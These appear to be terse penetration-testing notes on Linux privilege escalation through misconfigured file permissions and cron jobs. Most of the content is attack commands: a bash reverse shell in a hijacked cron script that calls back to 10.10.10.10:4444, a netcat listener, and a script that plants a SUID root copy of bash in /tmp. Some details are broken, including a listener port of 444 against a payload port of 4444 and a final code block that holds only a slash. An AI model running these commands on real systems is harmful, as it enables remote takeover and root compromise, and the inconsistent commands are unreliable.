# linux misconfigs

### weak file perms - /etc/shadow

check if `/etc/shadow` is readable or writeable

### shell escape sequences

https://gtfobins.github.io/

### cron jobs - file permissions

make sure cron job is writeable

edit a cron job:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

do this on kali:

```bash
nc -nvlp 444
```

### cron jobs - PATH environment variable

check if easy directories are located in cron job env variable

create a file in that easy directory:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

make sure file is executable

```bash
chmod +x /path/to/file.sh
```

wait for cron job to happen

```bash
/
```

